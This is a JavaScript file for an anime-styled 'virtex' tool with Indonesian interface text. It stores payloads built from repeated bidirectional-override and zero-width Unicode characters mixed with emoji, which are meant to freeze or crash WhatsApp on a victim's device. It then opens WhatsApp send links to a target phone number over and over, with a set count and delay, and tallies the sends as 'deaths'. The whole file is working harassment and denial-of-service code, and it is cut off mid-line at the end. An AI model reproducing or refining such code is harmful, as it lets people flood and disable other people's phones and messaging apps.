// ============================================
// AKARI-CHAN VIRTEX - ANIME EDITION
// Version: 1.0
// ============================================

// Database Virtex
const virtexDatabase = {
    1: "\u202E\u202A\u202D".repeat(300) + "🌸💕✨".repeat(100),
    2: "\u200B\u200C\u200D".repeat(500) + "💕".repeat(200),
    3: "😊💕🌸✨🌟💫⭐".repeat(300) + "💖".repeat(200),
    4: "🌟✨⭐💫⚡".repeat(400) + "\u202E".repeat(300),
    5: "🌸💕✨🌟⭐💫💖".repeat(500) + "\u202E\u202A\u202D".repeat(500)
};

// Global variables
let attackCount = 0;
let totalSent = 0;
let sessionCount = 0;
let isAttacking = false;
let attackTimer = null;
let currentTarget = '';
let currentType = '1';
let currentJumlah = 5;
let currentDelay = 1.5;

// Load saved data
function loadSavedData() {
    if (localStorage.getItem('akariTotalSent')) {
        totalSent = parseInt(localStorage.getItem('akariTotalSent'));
    }
    if (localStorage.getItem('akariSession')) {
        sessionCount = parseInt(localStorage.getItem('akariSession'));
    }
    
    document.getElementById('deathCount').textContent = totalSent;
    document.getElementById('sessionCount').textContent = sessionCount;
}

// Save data
function saveData() {
    localStorage.setItem('akariTotalSent', totalSent.toString());
    localStorage.setItem('akariSession', sessionCount.toString());
}

// Adjust jumlah
function adjustJumlah(change) {
    const input = document.getElementById('jumlah');
    let val = parseInt(input.value) + change;
    if (val < 1) val = 1;
    if (val > 100) val = 100;
    input.value = val;
    currentJumlah = val;
}

// Adjust delay
function adjustDelay(change) {
    const input = document.getElementById('delay');
    let val = parseFloat(input.value) + change;
    if (val < 0.5) val = 0.5;
    if (val > 5) val = 5;
    input.value = val.toFixed(1);
    currentDelay = val;
}

// Set jumlah
function setJumlah(val) {
    document.getElementById('jumlah').value = val;
    currentJumlah = val;
}

// Set delay
function setDelay(val) {
    document.getElementById('delay').value = val;
    currentDelay = val;
}

// Main function
function kirimVirtex() {
    if (isAttacking) {
        addLog('⚠️ Masih ada pengiriman berjalan!', 'warning');
        return;
    }
    
    const target = document.getElementById('targetNumber').value.trim();
    const type = document.getElementById('virtexType').value;
    const jumlah = parseInt(document.getElementById('jumlah').value);
    const delay = parseFloat(document.getElementById('delay').value) * 1000;
    
    // Validasi
    if (!target || target.length < 10) {
        addLog('❌ Nomor target tidak valid! Minimal 10 digit', 'error');
        return;
    }
    
    if (target.startsWith('0')) {
        addLog('❌ Gunakan format internasional (62xxx), bukan 0xxx', 'error');
        return;
    }
    
    // Start attack
    isAttacking = true;
    attackCount = 0;
    currentTarget = target;
    currentType = type;
    
    // Update UI
    document.getElementById('sendBtn').disabled = true;
    document.getElementById('emergencyStop').disabled = false;
    document.getElementById('statusText').textContent = '⚡ Mengirim... Mohon tunggu';
    
    // Log start
    addLog('✨✨✨ MEMULAI PENGIRIMAN ✨✨✨', 'separator');
    addLog(`📱 Target: ${target}`, 'info');
    addLog(`📦 Jumlah: ${jumlah}x`, 'info');
    addLog(`⏱️ Delay: ${delay/1000} detik`, 'info');
    addLog('✨✨✨✨✨✨✨✨✨✨✨', 'separator');
    
    // Get virtex
    const virtex = virtexDatabase[type];
    
    // Send function
    function send() {
        if (attackCount < jumlah && isAttacking) {
            attackCount++;
            totalSent++;
            sessionCount++;
            
            // Encode and open
            const encoded = encodeURIComponent(virtex + getRandomSparkles());
            const url = `https://api.whatsapp.com/send?phone=${target}&text=${encoded}`;
            window.open(url, '_blank');
            
            // Log
            addLog(`✅ [${attackCount}/${jumlah}] Terkirim!`, 'success');
            
            // Update stats
            document.getElementById('deathCount').textContent = totalSent;
            document.getElementById('sessionCount').textContent = sessionCount;
            saveData();
            
            // Vibrate if supported
            if (navigator.vibrate) {
                navigator.vibrate(50);
            }
            
            if (attackCount < jumlah && isAttacking) {
                attackTimer = setTimeout(send, delay);
            } else {
                finishAttack();
            }
        }
    }
    
    // Start after 1 second
    attackTimer = setTimeout(send, 1000);
}

// Emergency stop
function emergencyStop() {
    if (attackTimer) {
        clearTimeout(attackTimer);
        attackTimer = null;
    }
    
    isAttacking = false;
    
    addLog('⏹️ PENGIRIMAN DIHENTIKAN', 'warning');
    
    // Update UI
    document.getElementById('sendBtn').disabled = false;
    document.getElementById('emergencyStop').disabled = true;
    document.getElementById('statusText').textContent = 'Online • Siap bantu Akari-chan!';
}

// Finish attack
function finishAttack() {
    isAttacking = false;
    attackTimer = null;
    
    addLog('✨✨✨ SELESAI ✨✨✨', 'complete');
    addLog(`💕 Total terkirim: ${totalSent}`, 'info');
    
    // Update UI
    document.getElementById('sendBtn').disabled = false;
    document.getElementById('emergencyStop').disabled = true;
    document.getElementById('statusText').textContent = 'Online • Siap bantu Akari-chan!';
}

// Add log
function addLog(message, type) {
    const logBox = document.getElementById('logContainer');
    const entry = document.createElement('div');
    
    const time = new Date();
    const timestamp = `${time.getHours().toString().padStart(2,'0')}:${time.getMinutes().toString().padStart(2,'0')}:${time.getSeconds().toString().padStart(2,'0')}`;
    
    let color = '#b23b5e';
    let emoji = '💬';
    
    switch(type) {
        case 'error':
            color = '#f44336';
            emoji = '❌';
            break;
        case 'success':
            color = '#4caf50';
            emoji = '✅';
            break;
        case 'info':
            color = '#2196f3';
            emoji = 'ℹ️';
            break;
        case 'warning':
            color = '#ff9800';
            emoji = '⚠️';
            break;
        case 'separator':
            color = '#ff69b4';
            emoji = '';
            break;
        case 'complete':
            color = '#ff1493';
            emoji = '🎉';
            break;
    }
    
    entry.innerHTML = `<small style="color:#999">[${timestamp}]</small> ${emoji} ${message}`;
    entry.style.color = color;
    entry.style.margin = '6px 0';
    entry.style.padding = '6px 10px';
    entry.style.background = 'rgba(255,240,245,0.5)';
    entry.style.borderRadius = '12px';
    entry.style.borderLeft = `3px solid ${color}`;
    
    logBox.appendChild(entry);
    logBox.scrollTop = logBox.scrollHeight;
    
    // Limit logs
    while (logBox.children.length > 50) {
        logBox.removeChild(logBox.children[0]);
    }
}

// Clear log
function clearLog() {
    const logBox = document.getElementById('logContainer');
    logBox.innerHTML = '<div class="log-initial">🌸 Selamat datang, Akari-chan siap membantu! 🌸</div>';
    addLog('📝 Log dibersihkan', 'info');
}

// Export log
function exportLog() {
    const logBox = document.getElementById('logContainer');
    let text = 'AKARI-CHAN VIRTEX - LOG\n';
    text += '=======================\n';
    text += `Tanggal: ${new Date().toLocaleString()}\n`;
    text += `Total terkirim: ${totalSent}\n`;
    text += '=======================\n\n';
    
    Array.from(logBox.children).forEach(child => {
        text += child.innerText + '\n';
    });
    
    const blob = new Blob([text], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `akari-log-${Date.now()}.txt`;
    a.click();
    
    addLog('📥 Log diekspor', 'info');
}

// Get random sparkles
function getRandomSparkles() {
    const sparkles = ['✨','🌟','💫','⭐','🌸','💕'];
    let result = '';
    for (let i = 0; i < 20; i++) {
        result += sparkles[Math.floor(Math.random() * sparkles.length)];
    }
    return result;
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadSavedData();
    addLog('🌸 Akari-chan online! Selamat datang!', 'info');
    
    // Set initial values
    document.getElementById('jumlah').value = currentJumlah;
    document.getElementById('delay').value = currentDelay.toFixed(1);
    
    // Prevent
